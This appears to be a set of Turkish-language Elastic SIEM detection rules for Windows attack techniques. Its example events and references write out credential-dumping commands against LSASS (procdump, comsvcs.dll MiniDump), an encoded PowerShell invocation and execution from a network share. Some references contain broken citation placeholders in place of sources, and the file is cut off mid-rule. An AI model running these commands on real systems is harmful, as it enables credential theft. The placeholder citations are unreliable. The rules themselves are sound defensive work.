- title: "MS Office uygulamasının şüpheli alt süreç başlatması"
  id: "WIN-001"
  description: "Microsoft Office programlarının (Word, Excel, PowerPoint, Outlook) beklenmedik şekilde bir komut satırı veya betik işlemi başlatması tespit edildi. Bu durum genellikle kötü amaçlı bir Office makrosunun çalıştırıldığına işaret eder ve erken aşama bir saldırının göstergesi olabilir."
  severity: "high (Kötü amaçlı bir Office makrosunun sistemde kod yürüttüğünü gösterebileceği için yüksek önem taşır.)"
  tags: ["mitre:T1059", "kill_chain:Exploitation"]
  mitre_attack:
    - "T1059: Command and Scripting Interpreter"
  kill_chain_phase: "Exploitation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    winlog.event_id: 4688 and process.parent.name: (WINWORD.EXE or EXCEL.EXE or POWERPNT.EXE or OUTLOOK.EXE) and process.name: (cmd.exe or powershell.exe or cscript.exe or wscript.exe or mshta.exe)
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "winlog.event_id": 4688 } },
          { "terms": { "process.parent.name": ["WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE", "OUTLOOK.EXE"] } },
          { "terms": { "process.name": ["cmd.exe", "powershell.exe", "cscript.exe", "wscript.exe", "mshta.exe"] } }
        ]
      }
    }
  threshold_or_rate: "N/A (Tek bir olay bu alarmı tetikler.)"
  false_positive_notes: "Bu davranış normalde meşru değildir. Bazı nadir durumlarda özel eklentiler veya otomasyon araçları Office uygulamaları üzerinden komut çalıştırabilir; ancak ortamınızda böyle bir kullanım yoksa, bu aktivite büyük olasılıkla saldırı göstergesidir."
  response_playbook:
    - "Açılan Office belgesini tespit edip kaynağını doğrulayın; belge içindeki makro veya gömülü nesneleri inceleyin."
    - "İlgili hostu ağdan izole edin ve kapsamlı bir zararlı yazılım taraması gerçekleştirin."
    - "Benzer süreç etkinlikleri son 48 saat içinde başka sistemlerde de oluşmuş mu kontrol edin."
    - "Etkilenen kullanıcının hesap bilgilerini ve erişimlerini inceleyin, gerekiyorsa parolasını sıfırlayın."
  references:
    - "Elastic Kuralı: Office programlarından şüpheli süreç başlatılması:contentReference[oaicite:0]{index=0}"
    - "Gerçek saldırılarda Office makroları genellikle PowerShell indirme kiti çalıştırır:contentReference[oaicite:1]{index=1}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:00:00.000Z",
      "winlog.event_id": 4688,
      "process.parent.name": "WINWORD.EXE",
      "process.name": "powershell.exe",
      "process.command_line": "powershell -NoProfile -EncodedCommand ...",
      "user.name": "ahmet",
      "host.name": "PC-01"
    }
  short_explanation: "Office belgesinin açılmasıyla birlikte bir komut istemi veya PowerShell süreci başlamış. Alarmı gördüğünüzde, kullanıcının açtığı belgeyi ve bu belgenin başlattığı süreçleri inceleyin; alt sürecin komut satırı parametrelerinde kötü amaçlı komutlar olup olmadığına bakın."

- title: "Web tarayıcısı üzerinden şüpheli komut çalıştırma"
  id: "WIN-002"
  description: "Bir internet tarayıcısının (Örn. Chrome, IE/Edge, Firefox) beklenmedik şekilde komut satırı ya da betik çalıştırdığı tespit edildi. Bu durum tarayıcı güvenlik açığı istismarına veya bir zararlı indirme sonrası kod yürütülmesine işaret edebilir."
  severity: "high (Tarayıcı zafiyeti ile kod çalıştırma girişimini gösterdiği için yüksek önemde.)"
  tags: ["mitre:T1059", "kill_chain:Exploitation"]
  mitre_attack:
    - "T1059: Command and Scripting Interpreter"
  kill_chain_phase: "Exploitation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    winlog.event_id: 4688 and process.parent.name: (iexplore.exe or chrome.exe or firefox.exe or msedge.exe) and process.name: (cmd.exe or powershell.exe or cscript.exe or wscript.exe or mshta.exe)
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "winlog.event_id": 4688 } },
          { "terms": { "process.parent.name": ["iexplore.exe", "chrome.exe", "firefox.exe", "msedge.exe"] } },
          { "terms": { "process.name": ["cmd.exe", "powershell.exe", "cscript.exe", "wscript.exe", "mshta.exe"] } }
        ]
      }
    }
  threshold_or_rate: "N/A (Tek bir olayla alarm tetiklenir.)"
  false_positive_notes: "Tarayıcılar normalde kendi süreçlerinin dışında komut çalıştırmaz. Meşru eklentiler veya geliştirici araçları nadiren benzer davranış gösterebilir, ancak bu bilinen bir durum değilse aktivite şüphelidir."
  response_playbook:
    - "Etkilenen sistemdeki tarayıcı geçmişini ve indirmeleri gözden geçirin; kullanıcı yakın zamanda bilinmeyen bir siteye girmiş mi kontrol edin."
    - "Tarayıcıya eklenmiş eklentileri ve uzantıları denetleyin, şüpheli olanları devre dışı bırakın."
    - "Sistemi güncel yamalarla (tarayıcı ve eklentileri dahil) güncelleyin ve tam antivirüs taraması yapın."
    - "Aynı zaman diliminde benzer tarayıcı tabanlı alt süreç etkinlikleri diğer uç noktalarda görülmüş mü inceleyin."
  references:
    - "MITRE ATT&CK T1189: Drive-by Compromise – kullanıcı bir web sitesini ziyaret ettiğinde istemci tarayıcısının istismar edilmesiyle erişim elde edilebilir:contentReference[oaicite:2]{index=2}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:05:00.000Z",
      "winlog.event_id": 4688,
      "process.parent.name": "chrome.exe",
      "process.name": "cmd.exe",
      "process.command_line": "cmd.exe /c whoami",
      "user.name": "mehmet",
      "host.name": "PC-02"
    }
  short_explanation: "Bir web tarayıcısı, arka planda komut istemi çalıştırdı. Alarmı aldığınızda kullanıcının ziyaret ettiği son siteleri ve tarayıcı eklentilerini inceleyin; tarayıcının başlattığı komutun ne olduğunu ve neden tetiklendiğini araştırın."

- title: "Windows Script Host tarafından PowerShell çalıştırılması"
  id: "WIN-003"
  description: "Windows Scripting Host aracı (cscript.exe veya wscript.exe) aracılığıyla bir PowerShell süreci başlatıldı. Bu durum, genellikle kötü niyetli bir VBScript/JScript dosyasının PowerShell komutu çalıştırdığı bir enfeksiyon tekniğine işaret eder."
  severity: "medium (Betik motoru üzerinden PowerShell çalıştırıldığı için şüpheli ve incelenmesi gerekli.)"
  tags: ["mitre:T1059.001", "kill_chain:Exploitation"]
  mitre_attack:
    - "T1059.001: PowerShell"
  kill_chain_phase: "Exploitation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    winlog.event_id: 4688 and process.parent.name: (wscript.exe or cscript.exe) and process.name: powershell.exe
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "winlog.event_id": 4688 } },
          { "terms": { "process.parent.name": ["wscript.exe", "cscript.exe"] } },
          { "term": { "process.name": "powershell.exe" } }
        ]
      }
    }
  threshold_or_rate: "N/A (Her tespit tek başına alarm üretir.)"
  false_positive_notes: "Normal kullanıcı etkinliklerinde Windows Script Host'un PowerShell başlatması nadirdir. Sistem yöneticilerinin ya da kurulum scriptlerinin planlı kullanımı yoksa, bu olaylar genelde kötü amaçlıdır."
  response_playbook:
    - "PowerShell komutunun tam içeriğini ve parametrelerini inceleyin (örneğin, -EncodedCommand kullanılmış mı, hangi URL’lere bağlanıyor)."
    - "Bu işlemi başlatan .vbs/.js dosyasını veya komut dosyasını bulun; dosyayı izole edip zararlı olup olmadığını doğrulayın."
    - "İlgili kullanıcı hesabının son dönemde çalıştırdığı diğer script aktivitelerini ve indirdiği dosyaları araştırın."
    - "Gerekirse ilgili makineyi ağdan izole edip bellek ve disk görüntüsü alarak derinlemesine adli analiz yapın."
  references:
    - "Elastic Kuralı: WScript/CScript ile PowerShell çalıştırılması tespit kılavuzu:contentReference[oaicite:3]{index=3}"
    - "MITRE ATT&CK T1059.001: Saldırganlar, ilk erişimde zararlı WSH scriptleri ile ikinci aşama yükleri indirmek için PowerShell çağırabilir:contentReference[oaicite:4]{index=4}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:10:00.000Z",
      "winlog.event_id": 4688,
      "process.parent.name": "wscript.exe",
      "process.name": "powershell.exe",
      "process.command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\temp.ps1",
      "user.name": "veli",
      "host.name": "PC-03"
    }
  short_explanation: "WScript/CScript aracı, bir PowerShell komutu çalıştırdı. Bu alarmı alırsanız, çalıştırılan PowerShell komutunu ve onu tetikleyen .vbs/.js betiğini analiz edin; bu genellikle zararlı bir scriptin ikinci aşama yük indirdiğini gösterir."

- title: "LSASS sürecine erişim (Credential Dumping şüphesi)"
  id: "WIN-004"
  description: "Windows LSASS sürecine (Local Security Authority Subsystem Service) erişim veya dump alma girişimi tespit edildi. Bu, saldırganların bellekten parolalar/dosyalar çıkarmaya çalıştığı bir Credential Dumping tekniğine işaret eder (ör. Mimikatz veya procdump ile LSASS dump)."
  severity: "high (LSASS belleğinden kimlik bilgisi çıkarma girişimi kritik bir yetki kötüye kullanımı olduğu için yüksek önemde.)"
  tags: ["mitre:T1003.001", "kill_chain:ActionsOnObjectives"]
  mitre_attack:
    - "T1003.001: OS Credential Dumping: LSASS Memory"
  kill_chain_phase: "ActionsOnObjectives"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    (winlog.event_id: 4656 and winlog.event_data.TargetProcessName: "*lsass.exe*" and winlog.event_data.DesiredAccess: "*0x1F*") or (process.name: "procdump.exe" and process.command_line: "*lsass*") or (process.name: "rundll32.exe" and process.command_line: "*comsvcs.dll*")
  detection_query_dsl: >-
    {
      "bool": {
        "should": [
          {
            "bool": {
              "must": [
                { "term": { "winlog.event_id": 4656 } },
                { "wildcard": { "winlog.event_data.TargetProcessName": "*lsass.exe*" } },
                { "wildcard": { "winlog.event_data.DesiredAccess": "*0x1F*" } }
              ]
            }
          },
          {
            "bool": {
              "must": [
                { "term": { "process.name": "procdump.exe" } },
                { "wildcard": { "process.command_line": "*lsass*" } }
              ]
            }
          },
          {
            "bool": {
              "must": [
                { "term": { "process.name": "rundll32.exe" } },
                { "wildcard": { "process.command_line": "*comsvcs.dll*" } }
              ]
            }
          }
        ],
        "minimum_should_match": 1
      }
    }
  threshold_or_rate: "N/A (Tekil erişim girişimi dahi alarm oluşturur.)"
  false_positive_notes: "LSASS erişimi meşru yazılımlar tarafından nadiren yapılır. Windows hata ayıklama araçları veya bellek dökümü alan güvenlik yazılımları benzer izler üretebilir; ancak bu durumlar genellikle kontrollüdür. Beklenmedik LSASS erişimleri çoğunlukla zararlıdır."
  response_playbook:
    - "Erişim girişimini yapan işlemi ve komut satırını inceleyin (örneğin procdump ile mi çağrılmış, hangi kullanıcı çalıştırmış)."
    - "Eğer LSASS dump dosyası oluşturulduysa, bu dosyayı tespit edip güvenli bir ortama alarak analiz edin."
    - "İlgili sistemi derhal izole edin; bellek ve disk imajı alarak Mimikatz gibi araçların izlerini arayın."
    - "Etkilenen makinenin yerel ve etki alanı hesap parolalarını mümkünse değiştirin; elde edilmiş olabilecek kimlik bilgilerinin kötüye kullanımını engelleyin."
  references:
    - "MITRE ATT&CK T1003.001: Saldırganlar LSASS sürecinin belleğini okuyarak kimlik bilgilerini elde etmeye çalışabilir:contentReference[oaicite:5]{index=5}:contentReference[oaicite:6]{index=6}"
    - "Örnek olarak `procdump -ma lsass.exe` veya `rundll32.exe comsvcs.dll MiniDump` komutları LSASS dökümü alır:contentReference[oaicite:7]{index=7}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:15:00.000Z",
      "winlog.event_id": 4656,
      "winlog.event_data.TargetProcessName": "C:\\Windows\\System32\\lsass.exe",
      "winlog.event_data.DesiredAccess": "0x1fffff",
      "process.name": "procdump.exe",
      "process.command_line": "procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
      "user.name": "Administrator",
      "host.name": "Server-01"
    }
  short_explanation: "Bir işlem LSASS sürecine erişim veya dump alma girişiminde bulundu. Alarm aldığınızda, bu işlemin hangi araçla yapıldığına (procdump, Mimikatz vb.) bakın ve sistemdeki olası kimlik bilgisi sızıntısını engellemek için acil önlemler alın."

- title: "RDP Brute Force (çoklu başarısız Uzak Masaüstü girişimi)"
  id: "WIN-005"
  description: "Aynı kaynak IP adresi veya kullanıcı hesabı üzerinden kısa sürede birden fazla ardışık başarısız RDP oturum açma denemesi tespit edildi. Bu durum kaba kuvvet parola denemesi yapıldığına işaret eder."
  severity: "medium (Tekrarlanan başarısız oturum açma denemeleri parola tahmin saldırısını gösterdiğinden orta düzey önem taşır.)"
  tags: ["mitre:T1110.001", "kill_chain:Exploitation"]
  mitre_attack:
    - "T1110.001: Brute Force: Password Guessing"
  kill_chain_phase: "Exploitation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    winlog.event_id: 4625 and winlog.event_data.LogonType: "10"
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "winlog.event_id": 4625 } },
          { "term": { "winlog.event_data.LogonType": "10" } }
        ]
      }
    }
  threshold_or_rate: "Kaynak IP başına 5 başarısız RDP giriş denemesi (10 dk içinde)"
  false_positive_notes: "Yanlış kullanıcı adı/parola giren meşru kullanıcılar kısa süreliğine bu olaya sebep olabilir. Ancak bir hesaba veya IP'ye ait peş peşe çok sayıda hata, genellikle gerçek bir brute-force saldırısını gösterir. Sistem yöneticisinin planlı penetrasyon testleri dışında, birçok hata kaydı anormaldir."
  response_playbook:
    - "Saldırgan olabilecek IP adresini tespit edip geçici olarak engelleyin veya kara listeye alın."
    - "Hedeflenen kullanıcı hesabının parolasını zorlaştırın ve gerekiyorsa kilitleyin; çok fazla deneme varsa hesap kilitlenme politikalarını gözden geçirin."
    - "İlgili sistemin Uzak Masaüstü servisinde başarısız deneme loglarını doğrulayın; saldırganın kullandığı kullanıcı adlarını belirleyin (özellikle yaygın hesaplar hedef alınmış mı)."
    - "Aynı IP'nin diğer servislerde (VPN, SMTP vs.) başarısız giriş yapıp yapmadığını ağ ve güvenlik cihazı loglarından araştırın."
  references:
    - "MITRE ATT&CK T1110.001: Saldırganlar sık kullanılan şifrelerle çok sayıda parola tahmin denemesi yapabilir:contentReference[oaicite:8]{index=8}:contentReference[oaicite:9]{index=9}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:20:00.000Z",
      "winlog.event_id": 4625,
      "winlog.event_data.LogonType": "10",
      "winlog.event_data.IpAddress": "203.0.113.45",
      "user.name": "Administrator",
      "host.name": "Server-DC"
    }
  short_explanation: "Belirli bir kaynaktan kısa sürede birden fazla RDP oturum açma hatası görüldü. Alarmı aldıktan sonra, saldırganın IP adresini engelleyin ve hedef hesabın güvenliğini sağlamak (parola değişimi, MFA) için adımlar atın."

- title: "UAC Bypass girişimi (Fodhelper ile yetki atlama)"
  id: "WIN-006"
  description: "Standart kullanıcı haklarına sahip bir işlemin, Windows UAC'yi atlayarak yetkileri yükseltmeye çalıştığı tespit edildi. Özellikle fodhelper.exe gibi otomatik yükselme özelliği olan bir uygulamanın anormal şekilde çağrılması, UAC atlatma girişimine işaret eder."
  severity: "high (Kullanıcı Hesabı Denetimi'ni atlama girişimi sistem güvenliğini doğrudan tehdit ettiği için yüksek önem taşır.)"
  tags: ["mitre:T1548.002", "kill_chain:Installation"]
  mitre_attack:
    - "T1548.002: Bypass User Access Control"
  kill_chain_phase: "Installation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    winlog.event_id: 4688 and process.parent.name: explorer.exe and process.name: fodhelper.exe
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "winlog.event_id": 4688 } },
          { "term": { "process.parent.name": "explorer.exe" } },
          { "term": { "process.name": "fodhelper.exe" } }
        ]
      }
    }
  threshold_or_rate: "N/A (Tek seferlik tespit alarm oluşturur.)"
  false_positive_notes: "Fodhelper.exe Windows'un ayarlar aracı olduğundan normalde kullanıcı tıklaması olmadan çalışmaz. UAC bypass testleri dışında fodhelper'ın kendiliğinden çalışması beklenmez. Meşru bir senaryo genellikle yoktur."
  response_playbook:
    - "Fodhelper ile başlatılan alt sürecin komut satırını denetleyin; kayıt defterinde ms-settings yoluyla bir komut ayarlanmış mı bakın (UAC bypass tekniğinin izleri)."
    - "İlgili kullanıcı hesabının admin olmayan bir hesap olduğundan emin olun; gerekiyorsa bu hesaba ait yüklü programlarda zararlı kayıtlar (Run key vs.) kontrol edin."
    - "Sistemde benzer UAC atlatma denemeleri (ör. eventvwr.exe, ComputerDefaults.exe) de yapılmış mı logları tarayın."
    - "Güvenlik yazılımlarının UAC atlatma araçlarını (UACMe vb.) algılayıp engellediğini doğrulayın; mümkünse AppLocker/SRP ile fodhelper vb. otomatik yükselen uygulamaları kısıtlayın."
  references:
    - "MITRE ATT&CK T1548.002: Birçok UAC atlatma yöntemi keşfedilmiştir ve bazıları halen yamalanmamıştır, bu teknik admin ayrıcalıklarına kullanıcı izni olmadan ulaşmayı sağlar:contentReference[oaicite:10]{index=10}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:25:00.000Z",
      "winlog.event_id": 4688,
      "process.parent.name": "explorer.exe",
      "process.name": "fodhelper.exe",
      "process.command_line": "C:\\Windows\\System32\\fodhelper.exe",
      "user.name": "user1",
      "host.name": "PC-04"
    }
  short_explanation: "Bir standart kullanıcı oturumu, UAC'yi atlatmak amacıyla fodhelper.exe'yi çalıştırdı. Bu alarm göründüğünde, ilgili makinede kayıt defteri ayarlarını ve fodhelper tetiklenmesine neden olan işlemleri inceleyin; saldırganın yüksek yetki elde etmesini engellemek için adımları atın."

- title: "Sticky Keys arka kapı (erişim kolaylığıyla yetki yükseltme)"
  id: "WIN-007"
  description: "Windows Erişim Kolaylığı (Örn. sethc.exe 'Sticky Keys') işlevlerinin kötüye kullanılarak yetki yükseltme veya kimlik doğrulama atlatma girişimi tespit edildi. Özellikle winlogon.exe tarafından bir komut kabuğunun (cmd veya PowerShell) başlatılması, Sticky Keys arka kapısı yöntemine işaret eder."
  severity: "critical (Kimlik doğrulama ekranında SYSTEM yetkisiyle komut kabuğu açılması son derece kritik bir güvenlik ihlalidir.)"
  tags: ["mitre:T1546.008", "kill_chain:Installation"]
  mitre_attack:
    - "T1546.008: Accessibility Features"
  kill_chain_phase: "Installation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    winlog.event_id: 4688 and process.parent.name: winlogon.exe and process.name: (cmd.exe or powershell.exe)
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "winlog.event_id": 4688 } },
          { "term": { "process.parent.name": "winlogon.exe" } },
          { "terms": { "process.name": ["cmd.exe", "powershell.exe"] } }
        ]
      }
    }
  threshold_or_rate: "N/A (Tek bir tespit dahi alarmdır.)"
  false_positive_notes: "Winlogon.exe normalde etkileşimli kullanıcı oturumu dışında komut kabuğu başlatmaz. Erişim Kolaylığı araçlarının (Sticky Keys, Utilman vb.) admin yetkili komut açması meşru bir durum değildir; bu nedenle bu tespit genellikle gerçektir."
  response_playbook:
    - "Winlogon tetiklemesiyle açılan komut penceresinin nedenini araştırın; sethc.exe veya utilman.exe gibi dosyaların değiştirilip değiştirilmediğini kontrol edin."
    - "Windows\\System32 dizinindeki sethc.exe, utilman.exe gibi erişim kolaylığı uygulamalarının bütünlüğünü doğrulayın (hash karşılaştırması yaparak)."
    - "Sticky Keys arka kapısı oluşturulmuşsa, ilgili binaryleri orijinal halleriyle değiştirin ve sistemde başka arka kapı izleri (örn. IFEO registry anahtarları) arayın."
    - "Uzak Masaüstü veya konsol erişiminde bu yöntem kullanılarak yetkisiz oturum açılmadığından emin olmak için güvenlik loglarını geriye dönük analiz edin."
  references:
    - "MITRE ATT&CK T1546.008: Sticky Keys (sethc.exe) sıkça saldırganlar tarafından RDP oturum açma ekranında kimlik doğrulama olmadan sistem erişimi sağlamak için kullanılır:contentReference[oaicite:11]{index=11}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:30:00.000Z",
      "winlog.event_id": 4688,
      "process.parent.name": "winlogon.exe",
      "process.name": "cmd.exe",
      "process.command_line": "cmd.exe",
      "user.name": "N/A",
      "host.name": "Server-02"
    }
  short_explanation: "Winlogon süreci, oturum açma ekranında bir komut kabuğu başlattı (Sticky Keys tekniği). Bu alarm geldiğinde, sistemin sethc/utilman gibi erişim kolaylığı exe'lerinin değiştirilip değiştirilmediğini ve saldırganların etkileşime girip girmediğini acilen inceleyin."

- title: "Registry Run anahtarında kalıcılık (Başlangıç programı eklendi)"
  id: "WIN-008"
  description: "Windows başlangıç kayıt defteri anahtarlarında (Run/RunOnce) yeni bir giriş oluşturuldu veya mevcut girişlerde değişiklik yapıldı. Saldırganlar bu yöntemle her açılışta kötü amaçlı yazılımlarını otomatik çalıştırarak kalıcılık sağlar."
  severity: "medium (Sistemde kalıcı arka kapı yaratılabildiği için önemlidir ancak meşru yazılımlar da kurulum sırasında benzer değişiklik yapabilir.)"
  tags: ["mitre:T1547.001", "kill_chain:Installation"]
  mitre_attack:
    - "T1547.001: Registry Run Keys / Startup Folder"
  kill_chain_phase: "Installation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    winlog.event_id: 4657 and winlog.event_data.ObjectName: "*\\Windows\\CurrentVersion\\Run*"
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "winlog.event_id": 4657 } },
          { "wildcard": { "winlog.event_data.ObjectName": "*\\CurrentVersion\\Run*" } }
        ]
      }
    }
  threshold_or_rate: "N/A (Her tespit ayrı değerlendirilir.)"
  false_positive_notes: "Bazı meşru program kurulumları, kendi başlangıç öğelerini Run anahtarına ekler (ör. sürücü yazılımları, güncelleme denetleyicileri). Bu kayıt değişikliklerini program kurulum zamanlarına ve imzalarına göre doğrulayın. Bilinmeyen veya rastgele adlar içeren başlangıç girişleri genellikle zararlıdır."
  response_playbook:
    - "Kayıt defteri değişikliğiyle eklenen değerin adını ve çalıştırdığı komutu inceleyin; dosya yolunu takip ederek dosyayı (varsa) zararlı taramasından geçirin."
    - "Eğer değer bilinmeyen bir yazılıma işaret ediyorsa, ilgili dosyayı sistem başlangıcından kaldırın ve dosyayı karantinaya alın."
    - "Sistemde aynı zaman diliminde başka Persistence teknikleri de uygulanmış mı (hizmet oluşturma, görev zamanlama) logları inceleyin."
    - "Kullanıcıya ait veya sistem genelindeki Run anahtarlarını izlemeye devam edin; future değişiklikler için Elastic altyapısında kuralı sürekli aktif tutun."
  references:
    - "MITRE ATT&CK T1547.001: Kötü amaçlı yazılımlar, sistem açılışında çalışmak için Run kayıt defteri anahtarlarına kendilerini ekleyebilir:contentReference[oaicite:12]{index=12}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:35:00.000Z",
      "winlog.event_id": 4657,
      "winlog.event_data.ObjectName": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareUpdater",
      "winlog.event_data.NewValue": "\"C:\\Users\\Public\\malupdater.exe\"",
      "user.name": "SYSTEM",
      "host.name": "PC-05"
    }
  short_explanation: "Windows kayıt defterinin Run anahtarına yeni bir başlangıç programı eklendi. Alarmı gördüğünüzde, eklenen değerin ne olduğuna bakın; bilinmeyen bir program ise çalıştırılmasını engelleyin ve kaynağını araştırın."

- title: "Ağ paylaşımdan çalıştırılan süreç (SMB üzerinden yürütme)"
  id: "WIN-009"
  description: "Bir süreç, ağ üzerindeki bir paylaşımdan (UNC yoluyla) doğrudan çalıştırıldı. Kötü niyetli aktörler, PsExec gibi araçlarla veya ağ paylaşımı üzerinden zararlı çalıştırarak bu tekniği kullanabilir. Bu durum lateral movement (yatay yayılma) veya uzaktan kod yürütme belirtisi olabilir."
  severity: "high (Bir sistemin ağ üzerinden başka bir sistemde kod çalıştırdığı tespit edildiği için yüksek risklidir.)"
  tags: ["mitre:T1021.002", "kill_chain:ActionsOnObjectives"]
  mitre_attack:
    - "T1021.002: SMB/Windows Admin Shares"
  kill_chain_phase: "ActionsOnObjectives"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    winlog.event_id: 4688 and process.executable: "\\\\*"
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "winlog.event_id": 4688 } },
          { "wildcard": { "process.executable": "\\\\\\\\*" } }
        ]
      }
    }
  threshold_or_rate: "N/A (Her olay alarm değeri taşır.)"
  false_positive_notes: "Yönetici veya BT yazılımlarının, paylaşımdaki yazılımı çalıştırdığı senaryolar olabilir (ör. ağ üzerindeki yazılım dağıtımları). Ancak sıradan kullanıcı faaliyetinde bu beklenmez. Eğer böyle meşru bir kullanım yoksa, bu tespit muhtemelen bir saldırı göstergesidir."
  response_playbook:
    - "Hangi paylaşımdan hangi programın çalıştırıldığına bakın (UNC yolunu inceleyin); kaynağın meşru bir sunucu veya beklenmedik bir IP olup olmadığını belirleyin."
    - "Eğer olası bir PsExec kullanımı söz konusuysa, hedef sistemdeki servis ve event loglarını (Event ID 7045, Service Control Manager logları) kontrol edin."
    - "Bu etkinliği tetikleyen hesap ya da makineyi belirleyip izole edin; aynı hesap/makine üzerinden başka lateral hareket girişimleri olmuş mu (ör. WMI, WinRM) loglara bakın."
    - "Güvenlik duvarı ve ağ izleme ile, istemci makinelerin beklenmedik şekilde birbirine 445/TCP üzerinden bağlandığı durumlara karşı uyarı mekanizmaları oluşturun."
  references:
    - "MITRE ATT&CK T1569.002: Saldırganlar sc.exe veya PsExec gibi araçlarla uzaktan servis oluşturarak komut çalıştırabilir:contentReference[oaicite:13]{index=13}"
    - "MITRE ATT&CK T1021.002: Windows Admin Shares üzerinden saldırganlar uzak sistemlere bağlantı kurup kod icra edebilir (ör. SMB ile dosya kopyalayıp çalıştırma):contentReference[oaicite:14]{index=14}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:40:00.000Z",
      "winlog.event_id": 4688,
      "process.executable": "\\\\CORP-SERVER\\Share\\evil.exe",
      "process.name": "evil.exe",
      "user.domain": "CORP",
      "user.name": "pentest_user",
      "host.name": "Client-01"
    }
  short_explanation: "Bir istemci, ağ paylaşımdaki bir EXE dosyasını doğrudan çalıştırdı. Alarmı aldıktan sonra, çalıştırılan paylaşıma ait sunucuyu ve dosyayı araştırın; bu genellikle PsExec benzeri bir lateral hareket veya zararlı yayılması anlamına gelir."

- title: "PowerShell ile şifrelenmiş/obfusked komut kullanımı"
  id: "WIN-010"
  description: "Bir PowerShell işlemi, `-EncodedCommand` parametresi (veya benzeri kodlama teknikleri) kullanılarak çalıştırıldı. PowerShell komutlarının Base64 ile şifrelenmesi, saldırganların komutlarını gizlemek ve güvenlik önlemlerini atlatmak için yaygın başvurduğu bir yöntemdir."
  severity: "medium (PowerShell komutlarının kodlanmış şekilde çalıştırılması tespit edildiği için şüphelidir ve analiz gerektirir.)"
  tags: ["mitre:T1027", "kill_chain:Exploitation"]
  mitre_attack:
    - "T1027: Obfuscated Files or Information"
  kill_chain_phase: "Exploitation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    process.name: "powershell.exe" and process.command_line: "*-EncodedCommand*"
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "process.name": "powershell.exe" } },
          { "wildcard": { "process.command_line": "*-EncodedCommand*" } }
        ]
      }
    }
  threshold_or_rate: "N/A (Tek seferlik tespit alarm oluşturur.)"
  false_positive_notes: "Sistem yöneticileri bazen PowerShell komutlarını -EncodedCommand ile kullanabilir ancak bu nadirdir. Yazılım kurulumları veya güvenlik testleri dışında PowerShell'in bu şekilde çağrılması alışılmadık bir durumdur ve incelenmelidir."
  response_playbook:
    - "PowerShell komutunun tam çözümlenmiş halini elde etmeye çalışın (Base64 çözerek komut içeriğini okuyun). Komut ne yapıyor anlayın."
    - "Bu komutu başlatan kullanıcı veya süreç geçmişini inceleyin; meşru bir bakım faaliyeti mi yoksa zararlı tarafından mı tetiklenmiş belirleyin."
    - "İlgili sistemde PowerShell Script Block Logging açıksa, loglardan komut içeriğinin kaydını alın ve zararlı etkinlik işaretleri arayın."
    - "Aynı dönemde başka obfuskasyon belirtileri (ör. benzer encoded komutlar, garip değişken adları) diğer sistemlerde var mı karşılaştırın."
  references:
    - "MITRE ATT&CK T1027: Saldırganlar, kodlarını gizlemek için PowerShell komutlarını şifreleyebilir veya biçimini değiştirebilir (ör. Base64 ile):contentReference[oaicite:15]{index=15}"
    - "SentinelOne araştırması: Zararlı makrolar genellikle Base64 kodlu PowerShell **download cradle** komutları çalıştırır:contentReference[oaicite:16]{index=16}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:45:00.000Z",
      "process.name": "powershell.exe",
      "process.command_line": "powershell.exe -NoProfile -EncodedCommand SQBjAG...",
      "user.name": "user2",
      "host.name": "PC-06"
    }
  short_explanation: "PowerShell, `-EncodedCommand` parametresiyle (Base64 kodlu) bir komut çalıştırdı. Alarm oluştuğunda, komutu Base64'ten çözüp ne yaptığını analiz edin; genellikle bu teknik, zararlı PowerShell yüklerini gizlemek için kullanılır."

- title: "Yeni Windows servisi oluşturuldu (kalıcılık için hizmet kaydı)"
  id: "WIN-011"
  description: "Sistemde yeni bir Windows servisinin kurulduğu tespit edildi. Saldırganlar, yetkili erişim kazandıktan sonra kalıcı kalmak veya ayrıcalık yükseltmek için hizmet oluşturabilir. Bu etkinlik, Event ID 7045 (Yeni hizmet kuruldu) ile de ilişkilidir."
  severity: "medium (Yeni bir servis kurulumu her zaman kötü amaçlı olmasa da, beklenmedik servisler kalıcılık göstergesi olabileceğinden orta önemde değerlendirilir.)"
  tags: ["mitre:T1543.003", "kill_chain:Installation"]
  mitre_attack:
    - "T1543.003: Windows Service"
  kill_chain_phase: "Installation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    winlog.event_id: 7045
  detection_query_dsl: >-
    {
      "term": { "winlog.event_id": 7045 }
    }
  threshold_or_rate: "N/A (Her bir servis kurulumu alarm oluşturur.)"
